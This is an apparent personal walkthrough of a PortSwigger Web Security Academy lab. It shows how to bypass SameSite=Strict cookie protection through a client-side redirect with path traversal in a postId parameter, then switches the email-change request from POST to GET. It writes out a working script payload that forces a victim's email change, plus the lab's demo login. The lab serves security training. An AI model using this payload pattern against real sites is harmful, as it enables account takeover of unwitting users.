https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter



1) login as wiener:peter 
    here we noticed that in the response to the login post we have Set-Cookie: session=OAt3uIY9m6x1vUuX1w6KUdI1J2vWpPJx; Secure; HttpOnly; SameSite=Strict
    so we can do requests only exclusively from the same site

2) go on a post and write a comment 
    the website uses the paramtere postId to redirect to the commented post
    Now here we have a vulnerability because if we put 
    /post/comment/confirmation?postId=../../my-account we are able to return to the account page.


3) go on /my-account and try to change the email of wiener
4) with ZAP change the method POST to GET and see that the email changing is allowed with the GET verbe


5) now we can construct a script to force a victim to change his email 


<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>

we are able to force the email changing, because the request will start from the site itself to perform the redirect

SO THE REQUEST IS SAMESITE

we need submit (boh) because if we don't put it the server will respond missing parameter submit, we also need to encode & in %26
